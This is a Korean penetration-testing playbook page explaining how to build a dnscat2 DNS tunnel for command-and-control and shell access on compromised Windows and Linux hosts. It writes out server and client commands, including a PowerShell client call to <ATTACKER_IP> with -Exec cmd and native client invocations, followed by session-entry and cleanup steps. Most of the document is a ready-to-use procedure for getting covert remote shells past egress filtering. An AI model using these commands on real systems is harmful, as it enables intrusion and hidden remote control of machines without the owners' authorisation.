---
tags:
  - 환경/windows
  - 환경/linux
  - 서비스/dns
시작조건: ["대상 호스트 코드 실행", "외부 DNS 질의 가능"]
필요권한: ["대상 호스트 코드 실행 권한"]
필요조건: ["대상에서 외부 DNS 질의 가능", "공격 호스트에서 dnscat2 서버 수신 가능", "dnscat2 client 또는 PowerShell client 준비"]
결과: ["DNS 터널", "C2 세션", "셸"]
---

# dnscat2 DNS 터널링

## 한 줄 판단

대상에서 코드를 실행할 수 있고 대상의 DNS 질의가 공격 호스트 또는 공격자가 제어하는 권한 있는 DNS 경로까지 도달한다면, dnscat2로 명령 및 제어(Command and Control, C2) 채널을 만들어 현재 프로세스 권한의 셸을 얻는다.

## 사용할 때

- HTTP/HTTPS/TCP egress가 제한되지만 DNS 질의는 허용될 때.
- Windows 대상에서 PowerShell client를 실행하거나 Linux 대상에서 native C client를 실행할 수 있을 때.
- 일반 reverse shell 포트가 막혀 있고 DNS를 통한 명령 채널이 필요할 때.

## 전제 조건

| 조건 | 확인 방법 | 충족 기준 |
|---|---|---|
| 대상의 DNS 송신 경로 | 대상에서 `nslookup <DOMAIN>` | 질의가 공격 호스트 또는 위임한 권한 있는 DNS 서버까지 도달 |
| 코드 실행 | 대상 shell/PowerShell | client 실행 가능 |
| 서버 수신 | `dnscat2.rb --dns ...` | secret 생성 및 질의 수신 |

## 실행

### 선택 기준
| 단서 | 의미 | 다음 행동 |
|---|---|---|
| 대상이 외부 DNS를 질의함 | DNS 터널 가능 | dnscat2 server 시작 |
| dnscat2 server에 secret 표시 | client 인증/암호화 준비 | secret을 client에 적용 |
| client용 `New window created: <COMMAND_WINDOW_ID>` | 명령 session 생성 | 해당 ID를 기록하고 `window -i <COMMAND_WINDOW_ID>`로 진입 |

### 절차
1. 공격 호스트에서 dnscat2 server를 DNS 모드로 시작한다.
2. server가 출력한 secret을 복사해 client 명령에 사용한다.
3. 대상에 dnscat2 client 또는 `dnscat2.ps1`을 준비한다.
4. 대상에서 server 도메인/IP와 secret으로 client를 실행한다.
5. dnscat2 prompt에서 command window로 들어간다. native client라면 `shell`로 별도 shell window를 만들고, 실제 명령 결과로 셸을 확인한다.

### Linux 공격 호스트에서 server 시작

```bash
sudo ruby dnscat2.rb --dns host=<ATTACKER_IP>,port=53,domain=<DOMAIN> --no-cache
```

server는 다른 작업을 하지 않는 전용 terminal에서 실행한다. 시작 뒤 공격 호스트의 두 번째 shell에서 53번 listener 소유 프로세스를 확인해 `<SERVER_PID>`와 전체 명령행을 기록한다.

```bash
sudo ss -lunp | grep -E '[:.]53[[:space:]]'
ps -p <SERVER_PID> -o pid=,args=
```

확인할 출력:

- `New window created`
- client 실행에 사용할 `--secret` 값.

### Windows 대상에서 PowerShell client 실행

`dnscat2-powershell` 저장소는 2023년 8월부터 archived 상태이고 server cache와 호환되지 않는다. 이 client를 선택할 때는 아래 server 명령 가까이의 `--no-cache` 조건을 유지하고, 현재 PowerShell·방어 제어에서 module이 실제로 로드되는지 확인한다.

```powershell
$DNSCAT_CLIENT_PID = $PID
Get-CimInstance Win32_Process -Filter "ProcessId = $DNSCAT_CLIENT_PID" | Select-Object ProcessId,ExecutablePath,CommandLine
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver <ATTACKER_IP> -Domain <DOMAIN> -PreSharedSecret <SECRET> -Exec cmd
```

다른 작업을 하지 않는 전용 PowerShell process에서 실행하며 `$DNSCAT_CLIENT_PID`를 `<CLIENT_PID>`로 기록한다.

확인할 출력:

- server prompt에 새 session/window 생성.

### Linux 대상에서 native client 실행

권한 있는 DNS domain을 경유할 때:

```bash
./dnscat2 <DOMAIN> --secret=<SECRET> &
DNSCAT_CLIENT_PID=$!
ps -p "$DNSCAT_CLIENT_PID" -o pid=,args=
```

권한 있는 DNS domain 없이 server로 직접 UDP/53 질의할 때:

```bash
./dnscat2 --dns server=<ATTACKER_IP>,port=53 --secret=<SECRET> &
DNSCAT_CLIENT_PID=$!
ps -p "$DNSCAT_CLIENT_PID" -o pid=,args=
```

확인할 출력:

- server prompt에 `New window created: <COMMAND_WINDOW_ID>`가 표시된다. 이 출력은 command session 연결이며 shell 생성 성공은 아니다.

### Linux 공격 호스트에서 dnscat2 세션 진입

```text
dnscat2> ?
dnscat2> window -i <COMMAND_WINDOW_ID>
command session (...) <COMMAND_WINDOW_ID>> shell
dnscat2> windows
dnscat2> window -i <SHELL_WINDOW_ID>
```

확인할 출력:

- PowerShell client의 `-Exec cmd` window 또는 native client에서 새로 생성한 shell window로 들어가 `whoami`·`hostname`이나 `id`·`hostname` 결과를 확인한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| 대상의 `nslookup` 질의가 권한 있는 DNS 경로 또는 server에 도달함 | DNS egress baseline이 유효함 | DNS 터널 후보 | dnscat2 server와 domain 설정 |
| server가 구성한 UDP 53에서 수신하고 secret을 출력함 | DNS listener와 사전 공유 secret이 준비됨 | DNS server 준비 | 같은 domain·secret으로 client 실행 |
| client용 `New window created`와 연결이 보임 | DNS 명령 및 제어 채널이 생성됨 | dnscat2 command session | PowerShell `-Exec` window 또는 native client의 `shell` window에서 명령 실행 확인 |
| Windows window에서 `whoami`·`hostname` 결과가 돌아옴 | DNS 채널을 통한 Windows 명령 실행이 성공함 | Windows 명령 세션 | [[Windows 셸 또는 세션 확보 후 컨텍스트 열거]] |
| Linux window에서 `id`·`hostname` 결과가 돌아옴 | DNS 채널을 통한 Linux 명령 실행이 성공함 | Linux 명령 세션 | [[Linux 셸 확보 후 초기 열거와 권한 상승]] |
| DNS 질의가 server에 오지 않음 | 대상의 DNS 송신 경로, DNS 위임, resolver 또는 53번 수신 포트 문제 | 터널 미생성 | `nslookup`, packet capture, 방화벽과 domain 위임 확인 |
| 연결되지만 secret 오류가 남 | client·server 사전 공유 값이 다름 | 인증되지 않은 DNS 연결 | server가 출력한 secret 재적용 |
| client는 연결됐지만 shell이 없음 | `-Exec` 또는 client 실행 권한 문제 | dnscat2 제어 window만 확보 | window 유형과 client 옵션 확인 |

## 확인할 출력과 권한

| 확인 지점 | 확인할 출력 | 권한 판단 |
|---|---|---|
| DNS baseline | `nslookup` 응답과 server 또는 packet capture의 질의 | resolver 경로와 직접 53 포트 접근을 구분 |
| listener·protocol | 구성한 UDP 53 bind와 configured domain | DNS server 준비 여부 확인 |
| 세션 인증 | 동일 secret과 `New window created` | 단순 DNS 질의와 dnscat2 세션을 구분 |
| 셸 권한 | `whoami`, `hostname`, 명령 결과 | dnscat2 process의 실제 사용자와 호스트 확인 |

## 변경 영향과 복구

작업 전 공격 호스트에서 `ss -lunp`와 `ss -ltnp`로 53번 listener를 확인한다. Windows target에서는 `Test-Path -LiteralPath '<CLIENT_PATH>'`, Linux target에서는 `test -e '<CLIENT_PATH>'`로 전송 경로의 기존 파일 여부를 기록한다. 위 실행 단계에서 확인한 `<SERVER_PID>`·`dns<LISTENER_ID>`, 연결 뒤 `<COMMAND_WINDOW_ID>`·`<SHELL_WINDOW_ID>`, target의 `<CLIENT_PID>`와 실제 client 경로를 작업 기록에 보관한다. secret·자격 증명·명령 결과는 Vault에 기록하지 않는다.

정상 연결이 살아 있으면 하위 shell부터 닫는다.

```text
dnscat2> windows
dnscat2> kill <SHELL_WINDOW_ID>
dnscat2> kill <COMMAND_WINDOW_ID>
dnscat2> windows
```

`windows` 목록에서 기록한 두 ID가 사라졌는지 확인한다. Windows target에서는 전용 PowerShell 창의 `Ctrl+C`로 client를 끝내거나, 다른 셸에서 기록한 PID의 경로를 확인한 뒤에만 종료한다.

```powershell
Get-CimInstance Win32_Process -Filter "ProcessId = <CLIENT_PID>" | Select-Object ProcessId,ExecutablePath,CommandLine
Stop-Process -Id <CLIENT_PID>
Get-Process -Id <CLIENT_PID> -ErrorAction SilentlyContinue
```

Linux target에서는 기록한 PID와 명령행을 확인해 같은 프로세스일 때만 종료한다.

```bash
ps -p <CLIENT_PID> -o pid=,args=
kill <CLIENT_PID>
ps -p <CLIENT_PID> -o pid=,args=
```

그 뒤 공격 호스트의 server console에서 `quit` 또는 전용 terminal의 `Ctrl+C`로 server를 종료하고, 기록한 server PID와 53번 listener가 사라졌는지 확인한다. 연결이 이미 끊겼다면 server의 window 종료를 원격 정리 완료로 간주하지 않고, target에 다시 접근할 수 있을 때 기록한 `<CLIENT_PID>`·경로를 별도로 확인한다.

작업 전에는 없었고 이번 절차에서 전송한 것으로 확인된 client만 정확한 `<CLIENT_PATH>`에서 제거한다.

```powershell
Remove-Item -LiteralPath '<CLIENT_PATH>' -Force
Test-Path -LiteralPath '<CLIENT_PATH>'
```

```bash
rm -- '<CLIENT_PATH>'
test ! -e '<CLIENT_PATH>'
```

기존 파일이거나 작업 전 존재 여부를 확인하지 못한 경로는 삭제하지 않는다. 이 문서의 실행 절차는 DNS 위임 record나 방화벽 규칙을 만들지 않으므로 해당 설정을 일괄 변경하거나 제거하지 않는다.

## 관련 상태 라우터

- Windows 명령 세션: [[Windows 셸 또는 세션 확보 후 컨텍스트 열거]]
- Linux 명령 세션: [[Linux 셸 확보 후 초기 열거와 권한 상승]]
- 세션에서 새 내부망 경로 확인: [[내부망 경로 확보 후 피벗 구성]]

## 관련 도구

- [[dnscat2]]
- [[powershell]]

## 참고 링크

- [dnscat2 공식 README](https://github.com/iagox86/dnscat2/blob/master/README.md)
- [dnscat2-powershell 공식 저장소](https://github.com/lukebaggett/dnscat2-powershell)
